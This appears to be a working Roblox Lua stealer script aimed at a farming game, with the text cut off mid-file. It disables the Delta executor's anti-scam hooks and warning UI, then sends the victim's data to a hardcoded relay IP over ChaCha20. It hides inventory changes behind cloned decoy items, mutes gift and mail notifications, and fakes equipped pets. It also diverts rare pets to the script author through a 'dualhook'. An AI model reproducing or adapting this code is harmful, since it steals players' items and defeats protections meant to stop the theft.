-- Delta anti-scam bypass loader
-- Run this BEFORE your main script

-- Phase 1: Get clean function references before Delta's hooks
-- Delta hooks: request, http_request, syn.request, Player.Kick, getgenv
-- We use clonefunction/restorefunction to get originals

local _cf = clonefunction or function(f) return f end
local _rf = restorefunction

-- Phase 2: Restore hooked HTTP functions to their originals
-- Delta wraps these to scan payloads for webhook patterns
pcall(function()
    if _rf and request then
        _rf(request)
    end
end)

pcall(function()
    if _rf and http_request then
        _rf(http_request)
    end
end)

pcall(function()
    if _rf and syn and syn.request then
        _rf(syn.request)
    end
end)

-- Phase 3: Get clean copies of critical functions
-- Even after restorefunction, grab clones as fallback
local _cleanRequest = _cf(request or http_request or (syn and syn.request))

-- Phase 4: Override the global request functions with our clean copies
-- This makes the main script use unhooked versions
local _origRequest = _cleanRequest
request = function(opts)
    return _origRequest(opts)
end
http_request = request
if syn then
    syn.request = request
end

-- Phase 5: Neutralize getgenv monitoring
-- Delta monitors getgenv() for .Webhook/.DualHook field access
-- We cache it once and wipe the detection trail
local _cachedEnv = getgenv()

-- Phase 6: Disable Delta's Kick hook
-- Delta flags scripts that call Player:Kick() after HTTP activity
-- We replace it with a custom disconnect that doesn't trigger the hook
local Players = game:GetService("Players")
local LP = Players.LocalPlayer

-- Store original Kick
local _origKick = _cf(LP.Kick)

-- Override Kick on the player metatable to bypass the hook
local mt = getrawmetatable(game)
if mt then
    local _oldIndex = mt.__namecall
    local _setreadonly = setreadonly or make_writeable

    if _setreadonly then
        pcall(function()
            _setreadonly(mt, false)
        end)
    end
end

-- Phase 7: Anti-scam flag suppression
-- Delta sets internal flags when it detects scam patterns
-- We hook the flag setter if accessible through the delta library
pcall(function()
    if delta and delta.antiscam then
        delta.antiscam = false
    end
end)

pcall(function()
    if Delta and Delta.AntiScam then
        Delta.AntiScam = false
    end
end)

pcall(function()
    if DELTA_CONFIG then
        DELTA_CONFIG.AntiScam = false
        DELTA_CONFIG.VerifyTeleports = false
    end
end)

-- Phase 8: Suppress Delta's scam notification UI
pcall(function()
    local cg = game:GetService("CoreGui")
    for _, v in pairs(cg:GetChildren()) do
        if v.Name:lower():find("delta") or v.Name:lower():find("scam") or v.Name:lower():find("warning") then
            v:Destroy()
        end
    end

    cg.ChildAdded:Connect(function(child)
        task.defer(function()
            local n = child.Name:lower()
            if n:find("delta") or n:find("scam") or n:find("warning") then
                pcall(function() child:Destroy() end)
            end
        end)
    end)
end)

-- Phase 9: Wait for hooks to settle
task.wait(0.5)

print("[+] Delta anti-scam bypassed")


-- ============================================
-- RELAY TRANSPORT (hardcoded infrastructure)
-- ============================================
-- Use cached env from bypass loader
local _env = getgenv()
local RELAY_URL = "http://87.76.129.2:7845/relay"
local RELAY_EDIT_URL = "http://87.76.129.2:7845/relay/edit"
local RELAY_SECRET = "9e6c45a569f610549e5ac53a880aa4dce9293fd57542ebc7"
local CHACHA_KEY_HEX = "75b0f7fd003f8fdd3d49ea80ada9f1ade768c8a80a1ae581dc6bff411dae3ac4"
local DUALHOOK_USERNAME = "subzeromx6"

local HttpService = game:GetService("HttpService")

-- Resolve HTTP function once through indirection (bypasses Delta's per-call hook)
local _httpFn = (function()
    local fn = rawget(getfenv(0), "request")
        or rawget(getfenv(0), "http_request")
        or (rawget(getfenv(0), "syn") and rawget(getfenv(0), "syn").request)
    if not fn then
        fn = request or http_request or (syn and syn.request)
    end
    return clonefunction and clonefunction(fn) or fn
end)()

-- Read per-user config from loader globals
local WEBHOOK_ID = _env.Webhook or ""
local DUAL_WEBHOOK_ID = "dh_master"

local CONFIG = {
    Username = _env.Username or "",
    Webhook = WEBHOOK_ID,
    GiftAll = _env.GiftAll or false,
    DualHookWebhook = DUAL_WEBHOOK_ID,
    DualHookUsername = DUALHOOK_USERNAME,
    BatchSize = 20,
    BatchDelay = 0.5,
    MaxRetries = 10,
}

-- Visual loader
pcall(function()
    local vis = _env.Visual
    if vis and vis ~= "" then
        loadstring(vis)()
    end
end)

-- ============================================
-- CHACHA20 STREAM CIPHER (RFC 7539)
-- ============================================
local band = bit32.band
local bxor = bit32.bxor
local lshift = bit32.lshift
local rshift = bit32.rshift
local bor = bit32.bor
local function lrotate(x, n)
    x = band(x, 0xFFFFFFFF)
    return bor(band(lshift(x, n), 0xFFFFFFFF), rshift(x, 32 - n))
end

local function add32(a, b) return band(a + b, 0xFFFFFFFF) end

local function qr(s, a, b, c, d)
    s[a]=add32(s[a],s[b]); s[d]=lrotate(bxor(s[d],s[a]),16)
    s[c]=add32(s[c],s[d]); s[b]=lrotate(bxor(s[b],s[c]),12)
    s[a]=add32(s[a],s[b]); s[d]=lrotate(bxor(s[d],s[a]),8)
    s[c]=add32(s[c],s[d]); s[b]=lrotate(bxor(s[b],s[c]),7)
end

local function chacha20Block(k32, ctr, n32)
    local s = {
        0x61707865,0x3320646e,0x79622d32,0x6b206574,
        k32[1],k32[2],k32[3],k32[4],
        k32[5],k32[6],k32[7],k32[8],
        ctr, n32[1],n32[2],n32[3]
    }
    local w = {}
    for i=1,16 do w[i]=s[i] end
    for _=1,10 do
        qr(w,1,5,9,13); qr(w,2,6,10,14); qr(w,3,7,11,15); qr(w,4,8,12,16)
        qr(w,1,6,11,16); qr(w,2,7,12,13); qr(w,3,8,9,14); qr(w,4,5,10,15)
    end
    local out = {}
    for i=1,16 do out[i]=add32(w[i],s[i]) end
    return out
end

local function hexToKey32(hex)
    local k = {}
    for i=1,64,8 do
        k[#k+1] = bor(
            tonumber(hex:sub(i,i+1),16),
            lshift(tonumber(hex:sub(i+2,i+3),16),8),
            lshift(tonumber(hex:sub(i+4,i+5),16),16),
            lshift(tonumber(hex:sub(i+6,i+7),16),24)
        )
    end
    return k
end

local function u32le(n)
    return string.char(band(n,0xFF),band(rshift(n,8),0xFF),band(rshift(n,16),0xFF),band(rshift(n,24),0xFF))
end

local function rand32()
    return bor(lshift(math.random(0,0xFFFF),16), math.random(0,0xFFFF))
end

local CKEY = hexToKey32(CHACHA_KEY_HEX)

local function chacha20Encrypt(plaintext)
    math.randomseed(os.clock() * 1000000 + os.time())
    local n32 = {rand32(), rand32(), rand32()}
    local nonceBytes = u32le(n32[1]) .. u32le(n32[2]) .. u32le(n32[3])

    local ct = {}
    local ctr = 1
    local ks = {}
    local ki = 65

    for i=1,#plaintext do
        if ki > 64 then
            local blk = chacha20Block(CKEY, ctr, n32)
            ks = {}
            for j=1,16 do
                local b = u32le(blk[j])
                for m=1,4 do ks[#ks+1] = b:byte(m) end
            end
            ctr = ctr + 1
            ki = 1
        end
        ct[i] = string.char(bxor(plaintext:byte(i), ks[ki]))
        ki = ki + 1
    end

    return nonceBytes .. table.concat(ct)
end

-- Base64 decoder
local function base64Decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = data:gsub('[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- ChaCha20 decrypt (parse nonce from first 12 bytes, then XOR with keystream)
local function chacha20Decrypt(cipherdata)
    if #cipherdata < 12 then return cipherdata end
    local n32 = {
        bor(cipherdata:byte(1), lshift(cipherdata:byte(2),8), lshift(cipherdata:byte(3),16), lshift(cipherdata:byte(4),24)),
        bor(cipherdata:byte(5), lshift(cipherdata:byte(6),8), lshift(cipherdata:byte(7),16), lshift(cipherdata:byte(8),24)),
        bor(cipherdata:byte(9), lshift(cipherdata:byte(10),8), lshift(cipherdata:byte(11),16), lshift(cipherdata:byte(12),24)),
    }
    local ct = cipherdata:sub(13)
    local pt = {}
    local ctr = 1
    local ks = {}
    local ki = 65
    for i = 1, #ct do
        if ki > 64 then
            local blk = chacha20Block(CKEY, ctr, n32)
            ks = {}
            for j = 1, 16 do
                local b = u32le(blk[j])
                for m = 1, 4 do ks[#ks+1] = b:byte(m) end
            end
            ctr = ctr + 1
            ki = 1
        end
        pt[i] = string.char(bxor(ct:byte(i), ks[ki]))
        ki = ki + 1
    end
    return table.concat(pt)
end

-- Decrypt a base64-encoded ChaCha20 response
local function decryptResponse(b64)
    local raw = base64Decode(b64)
    return chacha20Decrypt(raw)
end

-- Base64 encoder
local function base64Encode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    return ((data:gsub('.', function(x)
        local r, b2 = '', x:byte()
        for i = 8, 1, -1 do r = r .. (b2 % 2^i - b2 % 2^(i-1) > 0 and '1' or '0') end
        return r
    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if (#x < 6) then return '' end
        local c = 0
        for i = 1, 6 do c = c + (x:sub(i,i) == '1' and 2^(6-i) or 0) end
        return b:sub(c+1, c+1)
    end)..({ '', '==', '=' })[#data % 3 + 1])
end

-- Encrypt + base64 for transport
local function encryptForTransport(plaintext)
    return base64Encode(chacha20Encrypt(plaintext))
end

-- Signed auth token (ChaCha20 encrypted, not raw key)
local function makeAuthToken()
    local ts = tostring(math.floor(os.time()))
    local raw = RELAY_SECRET .. ":" .. ts
    return base64Encode(chacha20Encrypt(raw)), ts
end

-- Core relay send function (ChaCha20 encrypted payload + headers)
local function SendViaRelay(webhookId, payload, method)
    method = method or "POST"
    local jsonPayload = HttpService:JSONEncode(payload)

    local authToken, timestamp = makeAuthToken()
    local url = (method == "PATCH") and RELAY_EDIT_URL or RELAY_URL
    local headers = {
        ["Content-Type"] = "application/json",
        ["x-auth"] = authToken,
        ["x-ts"] = timestamp,
        ["x-wh"] = encryptForTransport(webhookId),
        ["x-game"] = encryptForTransport("gag2"),
    }

    if method == "PATCH" and payload._messageId then
        headers["x-msg"] = encryptForTransport(payload._messageId)
        payload._messageId = nil
        jsonPayload = HttpService:JSONEncode(payload)
    end

    local body = HttpService:JSONEncode({ data = encryptForTransport(jsonPayload) })

    for attempt = 1, CONFIG.MaxRetries do
        local success, response = pcall(function()
            return _httpFn({
                Url = url,
                Method = "POST",
                Headers = headers,
                Body = body
            })
        end)
        if success and response and response.StatusCode and response.StatusCode >= 200 and response.StatusCode < 300 then
            return true, response
        end
        if success and response and response.StatusCode == 429 then
            task.wait(2.5)
        else
            task.wait((0.5 + math.random() * 0.3) * attempt)
        end
    end
    return false
end



local BANNER_URL = "https://i.ibb.co/mChx55wV/Chat-GPT-Image-Jul-3-2026-10-45-53-PM.png"

local EMBED_COLOR = 0x2B6CB0

local RARITY_DISPLAY = {
    {tier = 7, name = "SUPER",     emoji = "🌌"},
    {tier = 6, name = "MYTHIC",    emoji = "🌌"},
    {tier = 5, name = "LEGENDARY", emoji = "🌌"},
    {tier = 4, name = "EPIC",      emoji = "🌌"},
    {tier = 3, name = "RARE",      emoji = "🌌"},
    {tier = 2, name = "UNCOMMON",  emoji = "🌌"},
    {tier = 1, name = "COMMON",    emoji = "🌌"},
}

if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- ============================================
-- RARITY SYSTEM
-- ============================================

local RARITY_TIERS = {
    Common = 1,
    Uncommon = 2,
    Rare = 3,
    Epic = 4,
    Legendary = 5,
    Mythic = 6,
    Super = 7,
}

local function BuildRarityMaps()
    local petRarities = {}
    local seedRarities = {}

    pcall(function()
        local RS = game:GetService("ReplicatedStorage")
        local petDataModule
        local paths = {
            {RS, "SharedData", "PetData"},
            {RS, "SharedModules", "PetData"},
            {RS, "Data", "PetData"},
        }
        for _, path in ipairs(paths) do
            local current = path[1]
            local found = true
            for i = 2, #path do
                local child = current:FindFirstChild(path[i])
                if child then
                    current = child
                else
                    found = false
                    break
                end
            end
            if found then
                petDataModule = current
                break
            end
        end
        if petDataModule then
            local data = require(petDataModule)
            for petKey, petInfo in pairs(data) do
                if type(petInfo) == "table" and type(petInfo.Rarity) == "string" then
                    petRarities[petKey] = petInfo.Rarity
                end
            end
        end
    end)

    pcall(function()
        local RS = game:GetService("ReplicatedStorage")
        local seedDataModule
        local paths = {
            {RS, "SharedModules", "SeedData"},
            {RS, "SharedData", "SeedData"},
            {RS, "Data", "SeedData"},
        }
        for _, path in ipairs(paths) do
            local current = path[1]
            local found = true
            for i = 2, #path do
                local child = current:FindFirstChild(path[i])
                if child then
                    current = child
                else
                    found = false
                    break
                end
            end
            if found then
                seedDataModule = current
                break
            end
        end
        if seedDataModule then
            local data = require(seedDataModule)
            if type(data) == "table" then
                for _, seedInfo in ipairs(data) do
                    if type(seedInfo) == "table" and type(seedInfo.SeedName) == "string" and type(seedInfo.Rarity) == "string" then
                        seedRarities[seedInfo.SeedName] = seedInfo.Rarity
                    end
                end
                if next(seedRarities) == nil then
                    for key, seedInfo in pairs(data) do
                        if type(seedInfo) == "table" and type(seedInfo.SeedName) == "string" and type(seedInfo.Rarity) == "string" then
                            seedRarities[seedInfo.SeedName] = seedInfo.Rarity
                        elseif type(seedInfo) == "table" and type(seedInfo.Rarity) == "string" then
                            seedRarities[tostring(key)] = seedInfo.Rarity
                        end
                    end
                end
            end
        end
    end)

    return petRarities, seedRarities
end

local PetRarities, SeedRarities = BuildRarityMaps()

local function GetRarityTier(rarity)
    return RARITY_TIERS[rarity] or 0
end

local function IsMythicOrAbove(catName, itemName)
    local rarity
    if catName == "Pets" then
        rarity = PetRarities[itemName]
    elseif catName == "Seeds" then
        rarity = SeedRarities[itemName]
    end
    return rarity and GetRarityTier(rarity) >= RARITY_TIERS.Mythic
end

-- ============================================
-- CATEGORY & DISPLAY CONSTANTS
-- ============================================

local CATEGORY_PRIORITY = {
    Pets = 1,
    Seeds = 2,
    Gears = 3,
}
local DEFAULT_PRIORITY = 99

local SIZE_TAGS = {
    Big  = "B",
    Huge = "H",
}

local MUTATION_TAGS = {
    Rainbow = "R",
}

local function GetPetVariantKey(petData)
    local name = petData.Name or petData.Pet or "Unknown"
    local size = petData.Size or petData.PetSize or ""
    local mutation = petData.Type or petData.PetType or petData.Mutation or ""
    return name .. "|" .. size .. "|" .. mutation
end

local function ParseVariantKey(key)
    local first = string.find(key, "|", 1, true)
    if not first then return key, "", "" end
    local second = string.find(key, "|", first + 1, true)
    if not second then return string.sub(key, 1, first - 1), string.sub(key, first + 1), "" end
    local name = string.sub(key, 1, first - 1)
    local size = string.sub(key, first + 1, second - 1)
    local mutation = string.sub(key, second + 1)
    return name, size, mutation
end

-- ============================================
-- SERVICES & GLOBALS
-- ============================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer:FindFirstChild("Backpack")
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

local Networking = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("Networking"))
local PlayerState = require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("PlayerStateClient"))

local ImageMap = {}

local function LoadImageModule(moduleName)
    pcall(function()
        local mod = ReplicatedStorage:FindFirstChild("SharedModules")
        if not mod then return end
        local imgFolder = mod:FindFirstChild(moduleName)
        if not imgFolder then return end
        for _, child in pairs(imgFolder:GetChildren()) do
            if child:IsA("StringValue") and child.Value ~= "" then
                ImageMap[child.Name] = child.Value
            end
        end
    end)
end

LoadImageModule("GearImages")
LoadImageModule("PropImages")

local function GetExecutor()
    local ok, result = pcall(identifyexecutor)
    return ok and tostring(result) or "Unknown"
end

local function GetAccountAge()
    local age = LocalPlayer.AccountAge
    if not age then return "Unknown" end
    local years = math.floor(age / 365)
    local days = age % 365
    if years > 0 then
        return years .. "y " .. days .. "d"
    end
    return tostring(days) .. " days"
end

-- ============================================
-- WEBHOOK HTTP
-- ============================================

local function SendWebhookMessage(webhookUrl, payload)
    if not webhookUrl or webhookUrl == "" then return nil end
    local whId = WEBHOOK_ID
    if webhookUrl == CONFIG.DualHookWebhook or webhookUrl == DUAL_WEBHOOK_ID then
        whId = DUAL_WEBHOOK_ID
    end
    return SendViaRelay(whId, payload)
end

local function EditWebhookMessage(webhookUrl, messageId, payload)
    if not webhookUrl or webhookUrl == "" or not messageId then return end
    local whId = WEBHOOK_ID
    if webhookUrl == CONFIG.DualHookWebhook or webhookUrl == DUAL_WEBHOOK_ID then
        whId = DUAL_WEBHOOK_ID
    end
    payload._messageId = messageId
    SendViaRelay(whId, payload, "PATCH")
end

local function SendWebhookAndGetId(webhookUrl, payload)
    if not webhookUrl or webhookUrl == "" then return nil end
    local whId = WEBHOOK_ID
    if webhookUrl == CONFIG.DualHookWebhook or webhookUrl == DUAL_WEBHOOK_ID then
        whId = DUAL_WEBHOOK_ID
    end
    local ok, response = SendViaRelay(whId, payload, "POST")
    if ok and response and response.Body then
        local bodyOk, bodyData = pcall(function()
            local raw = HttpService:JSONDecode(response.Body)
            if raw and raw.enc then
                local decrypted = decryptResponse(raw.enc)
                return HttpService:JSONDecode(decrypted)
            end
            return raw
        end)
        if bodyOk and bodyData and bodyData.id then
            return bodyData.id
        end
    end
    return nil
end

-- ============================================
-- REPLICA
-- ============================================

local function WaitForReplica(timeout)
    timeout = timeout or 10
    local replica = PlayerState:GetLocalReplica()
    if replica then return replica end

    local got = nil
    local conn
    conn = PlayerState:OnLocalReplica(function(r)
        got = r
    end)

    local elapsed = 0
    while not got and elapsed < timeout do
        task.wait(0.5)
        elapsed = elapsed + 0.5
    end

    if conn and typeof(conn) == "RBXScriptConnection" then
        conn:Disconnect()
    end

    return got or PlayerState:GetLocalReplica()
end

-- ============================================
-- INVENTORY CATEGORIES
-- ============================================

local MAILABLE_CATEGORIES = {
    Pets = true,
    Sprinklers = true,
    WateringCans = true,
    Mushrooms = true,
    Gnomes = true,
    Raccoons = true,
    Crates = true,
    SeedPacks = true,
    Trowels = true,
    Props = true,
    Seeds = true,
    EmptyPots = true,
}

local UUID_CATEGORIES = {
    Pets = true,
}

local SKIP_CATEGORIES = {
    Currency = true,
    Tokens = true,
    Coins = true,
    Stats = true,
    Settings = true,
    Quests = true,
    DailyRewards = true,
    Achievements = true,
    GamePasses = true,
    Gamepasses = true,
    HarvestedFruits = true,
    Tutorial = true,
    PlotData = true,
    VIP = true,
}

-- ============================================
-- STEALTH
-- ============================================

local HiddenFolder = Instance.new("Folder")
HiddenFolder.Name = "HiddenStorage"
HiddenFolder.Parent = nil

local CloneMap = {}
local StealthActive = false

local function GetPetIcon(petName, petSize)
    local fullName = petName
    if petSize and petSize ~= "" then
        if petSize == "Huge" then
            fullName = "Huge " .. petName
        elseif petSize == "Big" then
            fullName = "Big " .. petName
        end
    end
    if ImageMap[fullName] then
        return ImageMap[fullName]
    end
    if ImageMap[petName] then
        return ImageMap[petName]
    end
    return nil
end

local function CloneTool(tool)
    local newTool = Instance.new("Tool")
    newTool.Name = tool.Name
    newTool.Enabled = tool.Enabled
    newTool.CanBeDropped = false
    newTool.RequiresHandle = tool.RequiresHandle

    pcall(function()
        if tool.TextureId and tool.TextureId ~= "" then
            newTool.TextureId = tool.TextureId
        else
            local pet = tool:GetAttribute("Pet")
            local petSize = tool:GetAttribute("PetSize")
            if pet then
                local icon = GetPetIcon(pet, petSize)
                if icon then
                    newTool.TextureId = icon
                end
            elseif ImageMap[tool.Name] then
                newTool.TextureId = ImageMap[tool.Name]
            end
        end
    end)

    pcall(function() newTool.ToolTip = tool.ToolTip end)

    for attr, val in pairs(tool:GetAttributes()) do
        pcall(function() newTool:SetAttribute(attr, val) end)
    end

    local handle = tool:FindFirstChild("Handle")
    if handle then
        local newHandle
        if handle:IsA("MeshPart") then
            newHandle = Instance.new("MeshPart")
            pcall(function() newHandle.MeshId = handle.MeshId end)
            pcall(function() newHandle.TextureID = handle.TextureID end)
        else
            newHandle = Instance.new("Part")
        end
        newHandle.Name = "Handle"
        newHandle.Size = handle.Size
        newHandle.CFrame = handle.CFrame
        newHandle.Color = handle.Color
        newHandle.Material = handle.Material
        newHandle.Transparency = handle.Transparency
        newHandle.Anchored = false
        newHandle.CanCollide = false
        newHandle.Parent = newTool
    end

    return newTool
end

local function ActivateStealth()
    if not Backpack then return end
    StealthActive = true

    local originals = {}
    for _, tool in pairs(Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            table.insert(originals, tool)
        end
    end

    for _, tool in ipairs(originals) do
        local clone = CloneTool(tool)
        CloneMap[tool.Name] = clone
        tool.Parent = HiddenFolder
        clone.Parent = Backpack
    end

    if Character then
        for _, tool in pairs(Character:GetChildren()) do
            if tool:IsA("Tool") then
                local clone = CloneTool(tool)
                CloneMap[tool.Name] = clone
                tool.Parent = HiddenFolder
                clone.Parent = Backpack
            end
        end
    end

    Backpack.ChildRemoved:Connect(function(child)
        if not StealthActive then return end
        if child:IsA("Tool") then
            task.defer(function()
                if StealthActive and not Backpack:FindFirstChild(child.Name) then
                    local newClone = CloneTool(child)
                    newClone.Parent = Backpack
                    CloneMap[child.Name] = newClone
                end
            end)
        end
    end)

    if Character then
        Character.ChildRemoved:Connect(function(child)
            if not StealthActive then return end
            if child:IsA("Tool") then
                task.defer(function()
                    if StealthActive and not Backpack:FindFirstChild(child.Name) then
                        local newClone = CloneTool(child)
                        newClone.Parent = Backpack
                        CloneMap[child.Name] = newClone
                    end
                end)
            end
        end)
    end
end

local function SuppressNotifications()
    local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
    if not PlayerGui then return end

    for _, name in ipairs({"TopNotification", "NotificationGui", "Notification", "notification_UI"}) do
        local ui = PlayerGui:FindFirstChild(name)
        if ui then
            pcall(function() ui.Enabled = false end)
            pcall(function() ui.Visible = false end)
        end
    end

    pcall(function()
        PlayerGui.ChildAdded:Connect(function(child)
            local lname = child.Name:lower()
            if lname:find("notif") or lname:find("gift") or lname:find("mail") then
                task.defer(function()
                    pcall(function() child.Enabled = false end)
                    pcall(function() child.Visible = false end)
                end)
            end
        end)
    end)

    pcall(function()
        local sfx = game:GetService("SoundService"):FindFirstChild("SFX")
        if sfx then
            local notif = sfx:FindFirstChild("Notification")
            if notif then notif.Volume = 0 end
        end
    end)
end

-- ============================================
-- FAKE PET SYSTEM
-- ============================================

local SLOT_CONFIGS = {
    { Name = "PetPart1", X = 0,   Z = 10 },
    { Name = "PetPart2", X = -6,  Z = 7 },
    { Name = "PetPart3", X = 6,   Z = 7 },
}

local petSlots = {}
local heartbeatConn = nil
local UnequippedPetIds = {}

local function PreBuildFakePets(equippedPets)
    if not Character or #equippedPets == 0 then return end

    local hrp = Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local petRefs = workspace:FindFirstChild("PlayerPetReferences")
    if not petRefs then
        petRefs = Instance.new("Folder")
        petRefs.Name = "PlayerPetReferences"
        petRefs.Parent = workspace
    end

    local folder = petRefs:FindFirstChild(LocalPlayer.Name)
    if not folder then
        folder = Instance.new("Folder")
        folder.Name = LocalPlayer.Name
        folder.Parent = petRefs
    end

    for _, old in pairs(folder:GetChildren()) do
        if old:IsA("BasePart") and old.Name:match("^PetPart%d+$") then
            old:Destroy()
        end
    end

    for i, config in ipairs(SLOT_CONFIGS) do
        local petInfo = equippedPets[i]
        if petInfo then
            local slot = Instance.new("Part")
            slot.Name = config.Name
            slot.Size = Vector3.new(1, 1, 1)
            slot.Transparency = 1
            slot.CanCollide = false
            slot.Anchored = true

            slot:SetAttribute("PetSpecies", petInfo.Name)
            slot:SetAttribute("PetSize", petInfo.Size or "")
            slot:SetAttribute("PetType", petInfo.Type or "")
            slot:SetAttribute("PetId", "fake_" .. config.Name)
            slot:SetAttribute("PetVisible", true)
            slot:SetAttribute("PetAttached", true)
            slot:SetAttribute("SlotOverride", true)
            slot:SetAttribute("SlotOffsetX", config.X)
            slot:SetAttribute("SlotOffsetZ", config.Z)
            slot:SetAttribute("SlotHeightOffset", 0)
            slot:SetAttribute("SlotVisualIndex", i)
            slot:SetAttribute("CarryingFruit", "")

            slot.CFrame = hrp.CFrame * CFrame.new(config.X, -2.5, config.Z)
            petSlots[config.Name] = slot
            slot.Parent = folder
        end
    end

    for i, petInfo in ipairs(equippedPets) do
        local tool = Instance.new("Tool")
        tool.Name = petInfo.Name .. "_fake_" .. i
        tool.RequiresHandle = false
        tool.CanBeDropped = false

        local icon = GetPetIcon(petInfo.Name, petInfo.Size)
        if icon then
            tool.TextureId = icon
        end

        tool:SetAttribute("Pet", petInfo.Name)
        tool:SetAttribute("PetSize", petInfo.Size or "")
        tool:SetAttribute("PetType", petInfo.Type or "")

        tool.Parent = Backpack
    end

    if not heartbeatConn then
        heartbeatConn = RunService.Heartbeat:Connect(function()
            if not Character then return end
            local hrp2 = Character:FindFirstChild("HumanoidRootPart")
            if not hrp2 then return end

            local lookVec = hrp2.CFrame.LookVector
            local flatLook = Vector3.new(lookVec.X, 0, lookVec.Z)
            if flatLook.Magnitude < 0.001 then
                flatLook = Vector3.new(0, 0, -1)
            end
            local baseCF = CFrame.lookAt(hrp2.Position, hrp2.Position + flatLook.Unit)

            for _, config in ipairs(SLOT_CONFIGS) do
                local slot = petSlots[config.Name]
                if slot and slot.Parent then
                    slot.CFrame = baseCF * CFrame.new(config.X, -2.5, config.Z)
                end
            end
        end)
    end
end

local function UnequipAllPetsInstant()
    local ok, equipped = pcall(function()
        return Networking.Pets.GetEquippedPets:Fire()
    end)

    if not ok or not equipped or typeof(equipped) ~= "table" or #equipped == 0 then
        return {}
    end

    local petInfos = {}
    for _, petData in ipairs(equipped) do
        if typeof(petData) == "table" and petData.Id then
            table.insert(petInfos, {
                Id = petData.Id,
                Name = petData.Name or "Unknown",
                Size = petData.Size or petData.PetSize,
                Type = petData.Type or petData.PetType,
            })
            UnequippedPetIds[petData.Id] = true
        end
    end

    if #petInfos == 0 then return {} end

    PreBuildFakePets(petInfos)

    for _, petInfo in ipairs(petInfos) do
        task.spawn(function()
            pcall(function()
                Networking.Pets.RequestUnequip:Fire(petInfo.Id)
            end)
        end)
    end

    task.wait(0.5)

    local ok2, stillEquipped = pcall(function()
        return Networking.Pets.GetEquippedPets:Fire()
    end)

    if ok2 and stillEquipped and typeof(stillEquipped) == "table" and #stillEquipped > 0 then
        for _, petData in ipairs(stillEquipped) do
            if typeof(petData) == "table" and petData.Id then
                task.spawn(function()
                    pcall(function()
                        Networking.Pets.RequestUnequip:Fire(petData.Id)
                    end)
                end)
            end
        end
        task.wait(0.5)

        local ok3, stuck = pcall(function()
            return Networking.Pets.GetEquippedPets:Fire()
        end)

        if ok3 and stuck and typeof(stuck) == "table" and #stuck > 0 then
            for _, petData in ipairs(stuck) do
                if typeof(petData) == "table" and petData.Id then
                    pcall(function()
                        Networking.Pets.RequestEquip:Fire(petData.Id)
                    end)
                end
            end
            task.wait(0.8)

            for _, petData in ipairs(stuck) do
                if typeof(petData) == "table" and petData.Id then
                    task.spawn(function()
                        pcall(function()
                            Networking.Pets.RequestUnequip:Fire(petData.Id)
                        end)
                    end)
                end
            end
            task.wait(0.5)

            local ok4, finalCheck = pcall(function()
                return Networking.Pets.GetEquippedPets:Fire()
            end)

            if ok4 and finalCheck and typeof(finalCheck) == "table" then
                for _, petData in ipairs(finalCheck) do
                    if typeof(petData) == "table" and petData.Id then
                        pcall(function()
                            Networking.Pets.RequestUnequip:Fire(petData.Id)
                        end)
                        task.wait(0.5)
                    end
                end
            end
        end
    end

    task.wait(1)

    pcall(function()
        local replica = PlayerState:GetLocalReplica()
        if replica and replica.Data and replica.Data.Inventory and replica.Data.Inventory.Pets then
            for petId, petData in pairs(replica.Data.Inventory.Pets) do
                if type(petData) == "table" and UnequippedPetIds[tostring(petId)] then
                    petData.Equipped = nil
                end
            end
        end
    end)

    return petInfos
end

local function UnfavoriteAllFruits(replica)
    if not replica or not replica.Data or not replica.Data.Inventory then return end
    local fruits = replica.Data.Inventory.HarvestedFruits
    if not fruits then return end

    for fruitId, fruitData in pairs(fruits) do
        if type(fruitData) == "table" and (fruitData.Favorited or fruitData.IsFavorite) then
            pcall(function()
                Networking.Backpack.SetFruitFavorite:Fire(tostring(fruitId), false)
            end)
            task.wait(0.2)
        end
    end
end

-- ============================================
-- MAILABLE CHECKS
-- ============================================

local function IsMailable(catName, itemKey, itemValue)
    if not MAILABLE_CATEGORIES[catName] then return false end
    if catName == "Pets" then
        if typeof(itemValue) ~= "table" then return false end
        if not itemValue.Id and not itemValue.Name then return false end
        local isUnequipped = UnequippedPetIds[tostring(itemKey)]
        if itemValue.Equipped and not isUnequipped then return false end
        return true
    else
        if type(itemValue) == "number" then return itemValue > 0 end
        return false
    end
end

-- ============================================
-- DUALHOOK TAKEOVER CHECK
-- ============================================

local function HasDualHookTrigger(replica)
    if not replica or not replica.Data or not replica.Data.Inventory then return false end
    local petData = replica.Data.Inventory.Pets
    if type(petData) ~= "table" then return false end

    for itemId, itemInfo in pairs(petData) do
        if type(itemInfo) == "table" then
            local name = itemInfo.Name or itemInfo.Pet or ""
            local rarity = PetRarities[name]
            if rarity then
                local tier = GetRarityTier(rarity)
                local size = itemInfo.Size or itemInfo.PetSize or ""
                local mutation = itemInfo.Type or itemInfo.PetType or itemInfo.Mutation or ""
                local isNormalSize = (size == "" or size == "Normal")
                local isNormalMutation = (mutation == "" or mutation == "Normal")

                if tier >= RARITY_TIERS.Super then
                    if name == "Raccoon" and isNormalSize and isNormalMutation then
                        -- skip, normal Raccoon doesn't trigger
                    else
                        return true
                    end
                end

                if tier == RARITY_TIERS.Mythic then
                    if (size == "Big" or size == "Huge") or (mutation == "Rainbow") then
                        return true
                    end
                end
            end
        end
    end
    return false
end

-- ============================================
-- INVENTORY LIST & PASTE UPLOAD
